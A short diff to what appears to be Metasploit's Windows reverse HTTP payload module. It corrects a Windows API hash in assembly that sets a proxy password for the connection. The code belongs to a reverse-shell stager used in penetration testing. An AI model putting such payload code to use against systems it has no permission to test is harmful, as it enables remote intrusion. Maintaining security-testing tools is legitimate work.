@@ -330,7 +330,7 @@ module Payload::Windows::ReverseHttp
                              ; LPVOID lpBuffer (password from previous call)
         push 44              ; DWORD dwOption (INTERNET_OPTION_PROXY_PASSWORD)
         push esi             ; hConnection
-        push #{Rex::Text.block_api_hash('wininet.dll', 'HttpAddRequestHeaders')}
+        push #{Rex::Text.block_api_hash('wininet.dll', 'InternetSetOptionA')}
         call ebp
       ^
     end
